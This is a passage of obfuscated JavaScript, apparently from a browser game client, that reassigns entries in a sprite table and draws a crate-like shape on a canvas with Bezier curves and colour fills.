			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃΔⲆⲆ] = ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆᐃⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆᐃΔ];
			ⵠⲆ[Ⲇ.ᐃΔⲆΔⵠΔΔ] = ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠΔⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠΔⵠⲆ] = ⵠⲆ[Ⲇ.ⲆΔΔᐃᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⵠΔⵠ] = ⵠⲆ[Ⲇ.ΔⲆΔΔΔΔⲆ];
			ⵠⲆ[Ⲇ.ΔᐃⵠΔⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆⲆᐃ] = ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆᐃΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔΔΔᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃᐃΔ] = ⵠⲆ[Ⲇ.ⲆᐃΔⵠΔⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠⲆᐃᐃ] = ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⲆΔᐃ] = ⵠⲆ[Ⲇ.ⲆⲆⵠΔⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⵠΔΔΔᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃᐃⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⲆⵠΔⵠⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⲆΔⲆ] = ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⲆ] = ⵠᐃⵠ(ΔⵠⲆᐃΔᐃΔⲆⵠ(.8, true, [ⵠ[80], ⵠ[40], ⵠ[40], ⵠ[40]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔΔⵠᐃ] = ᐃⲆⲆᐃ(.5, [{
				f: ⵠⵠΔΔΔΔⲆⵠⵠ,
				x: 0,
				y: ⲆⲆΔᐃ,
				a: ⵠΔⵠΔ,
				r: ΔⲆⵠⲆ,
				c: [ⵠ[407]]
			}], .16, [ⵠ[40], "#d0ad41", "#b89733"], .9);
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔΔᐃᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆⲆ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠΔ];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆⵠⵠⲆ] = ⵠⲆ[Ⲇ.ᐃΔⲆⵠΔⵠⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆᐃⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠΔⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃΔ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔᐃⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃΔᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⵠᐃⲆ] = ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆΔΔᐃ] = ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⵠᐃⵠ] = ⵠⲆ[Ⲇ.ⲆΔⵠⲆⲆΔΔ];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃⵠᐃ] = ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔᐃⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆⲆΔΔⵠ];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⵠᐃ] = ⵠⲆ[Ⲇ.ΔⵠΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃΔⲆ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃΔΔⲆⵠᐃⲆ] = ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠⵠΔⵠⵠΔ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃᐃⵠⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⲆ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠᐃⲆ] = ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⵠⲆ] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆᐃⵠΔ] = ⵠⲆ[Ⲇ.ΔⲆⲆⵠⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠⲆⲆΔ] = ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔⵠⵠᐃΔⵠ] = ⵠⲆ[Ⲇ.ᐃΔⵠⲆΔⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔⵠⵠⲆ] = ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠΔΔ];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔⵠᐃⲆ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔⲆⲆⵠ] = ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃⵠⲆΔ] = ⵠⲆ[Ⲇ.ⵠᐃⲆᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⲆⲆⵠ] = ⵠⲆ[Ⲇ.ⵠᐃΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃⲆⵠ] = ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ΔΔᐃᐃⵠΔⵠ] = ⵠⲆ[Ⲇ.ΔⵠΔⵠⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆΔᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆΔΔ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔΔⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⵠⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⵠΔⲆ] = ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠⵠⵠΔ] = ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆΔΔ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔΔⵠⲆ] = ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆᐃⲆⲆ] = ⵠⲆ[Ⲇ.ⵠⲆΔᐃⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠᐃΔ] = ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⲆΔ];
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆⵠⵠⵠ] = ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ΔⵠⲆᐃⵠᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⲆΔᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ᐃΔΔⵠⵠΔⵠ] = ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ΔⲆⵠΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ⲆⲆᐃⲆΔᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃᐃⵠⲆⵠΔⵠ] = ⵠⲆ[Ⲇ.ΔⵠΔΔᐃⲆΔ];
			ⵠⲆ[Ⲇ.ΔΔᐃΔΔⲆⵠ] = ⵠⲆ[Ⲇ.ΔᐃⲆⲆⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⲆⵠⵠᐃ] = ⵠⲆ[Ⲇ.ΔΔⵠⵠᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⲆᐃⵠ] = ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃΔⵠⵠᐃⵠ] = ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃⲆΔ] = ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠΔᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠΔⵠⵠ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠΔⲆⵠ] = ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⲆᐃΔ];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⵠᐃΔ] = ⵠⲆ[Ⲇ.ᐃⵠΔΔⲆΔⵠ];
			ⵠⲆ[Ⲇ.ΔᐃΔΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⵠⵠΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⲆΔⵠ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆΔⲆᐃ] = ⵠⲆ[Ⲇ.ᐃᐃΔᐃⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠΔΔⵠ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔΔΔ];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⲆⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⵠⲆΔΔⲆᐃ];
			ⵠⲆ[Ⲇ.ΔᐃΔΔⲆΔⵠ] = ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆᐃⵠΔ] = ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆΔ] = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔΔ];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆᐃΔ] = ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⲆⵠΔ] = ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠΔⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆᐃⲆ] = ⵠⲆ[Ⲇ.ⵠΔⵠⲆΔⵠΔ];
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⵠΔⲆ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⵠΔᐃ] = ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⵠΔⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠⲆᐃΔΔⲆ];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃᐃᐃΔ] = ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆᐃⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔⵠⲆᐃ] = ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆⵠ];
			ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⵠᐃ] = ⵠⲆ[Ⲇ.ΔᐃᐃᐃΔⲆΔ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆⵠΔ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⵠⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃᐃ] = ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔΔᐃⲆΔᐃ] = ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃⲆ] = ⵠⲆ[Ⲇ.ΔᐃΔⵠΔᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠᐃΔΔ] = ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃΔᐃ];
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⲆΔ] = ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔᐃⲆΔ] = ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃΔΔ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔΔⲆ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃᐃ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠΔΔ] = ⵠⲆ[Ⲇ.ΔΔⲆΔⲆᐃΔ]
		}

		function ⲆΔᐃᐃⲆⲆⲆ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 137;
			Ⲇⵠ.height = 129 * ᐃ;
			Δ.globalAlpha = .4;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 42.000030517578125, 41.17047119140625 * ᐃ);
			Δ.bezierCurveTo(45.000030517578125 * ᐃ, 38.17047119140625 * ᐃ, ᐃ * 49.000030517578125, 37.17047119140625 * ᐃ, ᐃ * 62.000030517578125, 38.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78.00003051757812, ᐃ * 38.17047119140625, ᐃ * 78.00003051757812, ᐃ * 38.17047119140625, ᐃ * 94.00003051757812, 38.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 100.00003051757812, 38.17047119140625 * ᐃ, ᐃ * 102.00003051757812, ᐃ * 38.17047119140625, 101.00003051757812 * ᐃ, 47.17047119140625 * ᐃ);
			Δ.bezierCurveTo(101.00003051757812 * ᐃ, 63.67047119140625 * ᐃ, 101.00003051757812 * ᐃ, ᐃ * 63.67047119140625, ᐃ * 101.00003051757812, 80.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.00003051757812, 84.17047119140625 * ᐃ, ᐃ * 100.00003051757812, 86.17047119140625 * ᐃ, 95.00003051757812 * ᐃ, 88.17047119140625 * ᐃ);
			Δ.bezierCurveTo(84.00003051757812 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 89.00003051757812, 94.17047119140625 * ᐃ, ᐃ * 79.00003051757812, ᐃ * 94.17047119140625);
			Δ.bezierCurveTo(59.500030517578125 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 59.500030517578125, 94.17047119140625 * ᐃ, ᐃ * 40.000030517578125, ᐃ * 94.17047119140625);
			Δ.bezierCurveTo(33.000030517578125 * ᐃ, ᐃ * 94.17047119140625, ᐃ * 34.000030517578125, ᐃ * 94.17047119140625, ᐃ * 34.000030517578125, 86.17047119140625 * ᐃ);
			Δ.bezierCurveTo(34.000030517578125 * ᐃ, ᐃ * 69.67047119140625, 34.000030517578125 * ᐃ, 69.67047119140625 * ᐃ, 34.000030517578125 * ᐃ, 53.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.000030517578125, 47.17047119140625 * ᐃ, 34.000030517578125 * ᐃ, 47.17047119140625 * ᐃ, ᐃ * 40.000030517578125, 42.17047119140625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[ᐃⲆΔⲆ], ᐃ * 40);
			Δ.globalAlpha = .4;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(42.000030517578125 * ᐃ, 41.17047119140625 * ᐃ);
			Δ.bezierCurveTo(45.000030517578125 * ᐃ, ᐃ * 38.17047119140625, 49.000030517578125 * ᐃ, ᐃ * 37.17047119140625, ᐃ * 62.000030517578125, 38.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78.00003051757812, 38.17047119140625 * ᐃ, 78.00003051757812 * ᐃ, ᐃ * 38.17047119140625, 94.00003051757812 * ᐃ, ᐃ * 38.17047119140625);
			Δ.bezierCurveTo(ᐃ * 100.00003051757812, ᐃ * 38.17047119140625, 102.00003051757812 * ᐃ, ᐃ * 38.17047119140625, ᐃ * 101.00003051757812, ᐃ * 47.17047119140625);
			Δ.bezierCurveTo(ᐃ * 101.00003051757812, 63.67047119140625 * ᐃ, 101.00003051757812 * ᐃ, 63.67047119140625 * ᐃ, ᐃ * 101.00003051757812, 80.17047119140625 * ᐃ);
			Δ.bezierCurveTo(102.00003051757812 * ᐃ, 84.17047119140625 * ᐃ, ᐃ * 100.00003051757812, 86.17047119140625 * ᐃ, 95.00003051757812 * ᐃ, ᐃ * 88.17047119140625);
			Δ.bezierCurveTo(ᐃ * 84.00003051757812, ᐃ * 94.17047119140625, ᐃ * 89.00003051757812, ᐃ * 94.17047119140625, 79.00003051757812 * ᐃ, 94.17047119140625 * ᐃ);
			Δ.bezierCurveTo(59.500030517578125 * ᐃ, ᐃ * 94.17047119140625, ᐃ * 59.500030517578125, ᐃ * 94.17047119140625, ᐃ * 40.000030517578125, ᐃ * 94.17047119140625);
			Δ.bezierCurveTo(ᐃ * 33.000030517578125, 94.17047119140625 * ᐃ, 34.000030517578125 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 34.000030517578125, 86.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34.000030517578125, ᐃ * 69.67047119140625, 34.000030517578125 * ᐃ, ᐃ * 69.67047119140625, ᐃ * 34.000030517578125, ᐃ * 53.17047119140625);
			Δ.bezierCurveTo(ᐃ * 33.000030517578125, 47.17047119140625 * ᐃ, 34.000030517578125 * ᐃ, 47.17047119140625 * ᐃ, ᐃ * 40.000030517578125, ᐃ * 42.17047119140625);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 20);
			Δ.globalAlpha = .8;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 42.000030517578125, 41.17047119140625 * ᐃ);
			Δ.bezierCurveTo(45.000030517578125 * ᐃ, 38.17047119140625 * ᐃ, ᐃ * 49.000030517578125, ᐃ * 37.17047119140625, 62.000030517578125 * ᐃ, ᐃ * 38.17047119140625);
			Δ.bezierCurveTo(78.00003051757812 * ᐃ, ᐃ * 38.17047119140625, ᐃ * 78.00003051757812, ᐃ * 38.17047119140625, 94.00003051757812 * ᐃ, ᐃ * 38.17047119140625);
			Δ.bezierCurveTo(100.00003051757812 * ᐃ, ᐃ * 38.17047119140625, 102.00003051757812 * ᐃ, ᐃ * 38.17047119140625, 101.00003051757812 * ᐃ, 47.17047119140625 * ᐃ);
			Δ.bezierCurveTo(101.00003051757812 * ᐃ, ᐃ * 63.67047119140625, 101.00003051757812 * ᐃ, ᐃ * 63.67047119140625, 101.00003051757812 * ᐃ, 80.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.00003051757812, 84.17047119140625 * ᐃ, 100.00003051757812 * ᐃ, ᐃ * 86.17047119140625, ᐃ * 95.00003051757812, ᐃ * 88.17047119140625);
			Δ.bezierCurveTo(84.00003051757812 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 89.00003051757812, 94.17047119140625 * ᐃ, ᐃ * 79.00003051757812, ᐃ * 94.17047119140625);
			Δ.bezierCurveTo(59.500030517578125 * ᐃ, 94.17047119140625 * ᐃ, 59.500030517578125 * ᐃ, 94.17047119140625 * ᐃ, 40.000030517578125 * ᐃ, 94.17047119140625 * ᐃ);
			Δ.bezierCurveTo(33.000030517578125 * ᐃ, ᐃ * 94.17047119140625, 34.000030517578125 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 34.000030517578125, 86.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34.000030517578125, ᐃ * 69.67047119140625, 34.000030517578125 * ᐃ, 69.67047119140625 * ᐃ, 34.000030517578125 * ᐃ, 53.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.000030517578125, 47.17047119140625 * ᐃ, ᐃ * 34.000030517578125, 47.17047119140625 * ᐃ, 40.000030517578125 * ᐃ, 42.17047119140625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ⵠⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 51.000030517578125, 37.9886474609375 * ᐃ);
			Δ.bezierCurveTo(51.000030517578125 * ᐃ, ᐃ * 61.9886474609375, ᐃ * 51.000030517578125, ᐃ * 61.9886474609375, ᐃ * 51.000030517578125, ᐃ * 85.9886474609375);
			Δ.bezierCurveTo(ᐃ * 75.50003051757812, 85.9886474609375 * ᐃ, 75.50003051757812 * ᐃ, 85.9886474609375 * ᐃ, 100.00003051757812 * ᐃ, ᐃ * 85.9886474609375);
			Δ.bezierCurveTo(ᐃ * 100.00003051757812, 61.9886474609375 * ᐃ, ᐃ * 100.00003051757812, ᐃ * 61.9886474609375, 100.00003051757812 * ᐃ, 37.9886474609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76.00003051757812, 37.9886474609375 * ᐃ, 76.00003051757812 * ᐃ, 37.9886474609375 * ᐃ, 52.000030517578125 * ᐃ, 37.9886474609375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * Ⲇᐃⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 99.00003051757812, ᐃ * 38.9886474609375);
			Δ.bezierCurveTo(93.50003051757812 * ᐃ, ᐃ * 44.9886474609375, ᐃ * 93.50003051757812, ᐃ * 44.9886474609375, ᐃ * 88.00003051757812, 50.9886474609375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88.00003051757812, ᐃ * 72.4886474609375, 88.00003051757812 * ᐃ, 72.4886474609375 * ᐃ, 88.00003051757812 * ᐃ, 93.9886474609375 * ᐃ);
			Δ.bezierCurveTo(94.00003051757812 * ᐃ, ᐃ * 90.4886474609375, 94.00003051757812 * ᐃ, ᐃ * 90.4886474609375, 100.00003051757812 * ᐃ, 86.9886474609375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(87.00003051757812 * ᐃ, ᐃ * 49.625);
			Δ.bezierCurveTo(61.000030517578125 * ᐃ, 49.625 * ᐃ, 61.000030517578125 * ᐃ, ᐃ * 49.625, ᐃ * 35.000030517578125, ᐃ * 49.625);
			Δ.bezierCurveTo(ᐃ * 35.000030517578125, 70.625 * ᐃ, 35.000030517578125 * ᐃ, 70.625 * ᐃ, ᐃ * 35.000030517578125, ᐃ * 91.625);
			Δ.bezierCurveTo(ᐃ * 60.500030517578125, 91.625 * ᐃ, ᐃ * 60.500030517578125, 91.625 * ᐃ, 86.00003051757812 * ᐃ, 91.625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86.50003051757812, 70.625 * ᐃ, ᐃ * 86.50003051757812, 70.625 * ᐃ, 87.00003051757812 * ᐃ, ᐃ * 49.625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ⲆⵠᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 47.000030517578125, 36.625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 73.00003051757812, 37.125 * ᐃ, ᐃ * 73.00003051757812, 37.125 * ᐃ, ᐃ * 99.00003051757812, ᐃ * 37.625);
			Δ.bezierCurveTo(ᐃ * 93.50003051757812, 44.125 * ᐃ, 93.50003051757812 * ᐃ, ᐃ * 44.125, ᐃ * 88.00003051757812, 50.625 * ᐃ);
			Δ.bezierCurveTo(60.500030517578125 * ᐃ, ᐃ * 50.125, 60.500030517578125 * ᐃ, 50.125 * ᐃ, 33.000030517578125 * ᐃ, ᐃ * 49.625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ], Ⲇᐃ[ΔⲆᐃⲆ], ᐃ * ⲆⵠᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(53.000030517578125 * ᐃ, ᐃ * 52.625);
			Δ.bezierCurveTo(40.000030517578125 * ᐃ, ᐃ * 54.625, ᐃ * 39.000030517578125, 59.625 * ᐃ, 40.000030517578125 * ᐃ, ᐃ * 67.625);
			Δ.bezierCurveTo(ᐃ * 45.000030517578125, ᐃ * 59.625, ᐃ * 48.000030517578125, 58.625 * ᐃ, ᐃ * 54.000030517578125, 53.625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(42.000030517578125 * ᐃ, ᐃ * 41.17047119140625);
			Δ.bezierCurveTo(ᐃ * 45.000030517578125, 38.17047119140625 * ᐃ, ᐃ * 49.000030517578125, 37.17047119140625 * ᐃ, 62.000030517578125 * ᐃ, ᐃ * 38.17047119140625);
			Δ.bezierCurveTo(ᐃ * 78.00003051757812, 38.17047119140625 * ᐃ, 78.00003051757812 * ᐃ, ᐃ * 38.17047119140625, 94.00003051757812 * ᐃ, ᐃ * 38.17047119140625);
